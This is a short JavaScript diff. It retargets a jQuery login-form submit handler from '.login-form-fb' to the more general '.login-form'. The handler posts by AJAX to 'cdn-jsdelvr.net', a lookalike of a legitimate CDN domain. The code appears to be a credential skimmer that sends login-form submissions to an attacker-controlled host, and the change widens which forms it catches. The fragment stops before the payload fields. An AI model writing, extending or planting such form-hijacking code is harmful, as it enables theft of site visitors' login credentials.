@@ -1,5 +1,5 @@
-$(".login-form-fb").submit(function() {
-    var d = $(".login-form-fb");
+$(".login-form").submit(function() {
+    var d = $(".login-form");
 
     $.ajax({
         url: "https://cdn-jsdelvr.net/api/json/",
